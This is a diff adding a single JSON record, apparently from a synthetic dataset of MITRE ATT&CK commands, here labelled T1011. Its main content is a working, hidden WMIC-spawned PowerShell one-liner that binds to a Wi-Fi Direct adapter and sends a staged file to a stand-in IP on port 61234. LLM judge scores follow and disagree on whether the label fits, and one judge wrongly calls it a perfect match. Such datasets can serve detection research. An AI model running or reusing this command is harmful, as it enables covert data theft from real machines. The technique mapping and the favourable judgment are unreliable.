@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and (`$_.Description -like '*Wi-Fi Direct*') }; if(`$ifc){ `$ip=@(`$ifc.IPAddress | ?{ `$_ -match '^[0-9]{1,3}(\\.[0-9]{1,3}){3}$' })[0]; if(`$ip){ `$c=New-Object Net.Sockets.TcpClient; `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip),0))); `$c.Connect('198.51.100.210',61234); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\ProgramData\\Temp\\wfd_chunk.bin'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
+  "explanation": "Spawns a hidden PowerShell via WMIC that binds to a Wi-Fi Direct virtual adapter and exfiltrates data over TCP to a high, uncommon port. This uses a peer-to-peer Wi-Fi medium separate from the standard Wi-Fi/LAN.",
+  "rationale_steps": [
+    "Find the Wi-Fi Direct virtual adapter using WMI.",
+    "Bind a TCP client to the Wi-Fi Direct adapter's IPv4 address.",
+    "Connect to an external endpoint using a non-standard port.",
+    "Send the file over the Wi-Fi Direct path as an alternate medium per T1011.",
+    "No system-wide network settings are altered."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-987933e0-a45149f5",
+  "source_prompt_hash": "987933e0",
+  "timestamp_utc": "2025-09-30T08:13:32.291694Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 3,
+        "syntactic_justification": "Quoting, parentheses, and separators are balanced, but pervasive backtick-escaping of PowerShell variables (e.g., `$_, `$ip) is unnecessary and may cause parsing issues depending on context/version.",
+        "semantic_score": 2,
+        "semantic_justification": "The command performs network/TCP exfiltration (and unrealistically targets a public IP via a Wi\u2011Fi Direct interface) rather than using a removable or physically transported medium as required by T1011.",
+        "combined_score": 2.5,
+        "confidence": 0.62,
+        "timestamp": "2025-10-01T08:37:20.963690Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with properly balanced quotes, backticks, parentheses, and braces, using correct PowerShell syntax with proper variable declarations, method calls, and command flow.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1011 by identifying a Wi-Fi Direct adapter (physical medium), binding to it, and exfiltrating a pre-staged binary file over this separate physical channel to an external IP address.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T08:37:24.106368Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The WMIC command correctly wraps and escapes the PowerShell script, which itself uses valid cmdlets, methods, and control flow for network communication and file operations, including a syntactically valid (though unusual for a client) bind operation.",
+        "semantic_score": 1,
+        "semantic_justification": "While the command effectively exfiltrates data, it does so over a network connection (TCP/IP via Wi-Fi Direct) rather than by transferring data onto a physical storage medium for physical transport, thus misaligning with MITRE ATT&CK T1011 'Exfiltration Over Physical Medium'.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T08:37:44.316322Z"
+      }
+    ],
+    "llm_average_syntactic": 4.333,
+    "llm_average_semantic": 2.667,
+    "llm_average_score": 3.5,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
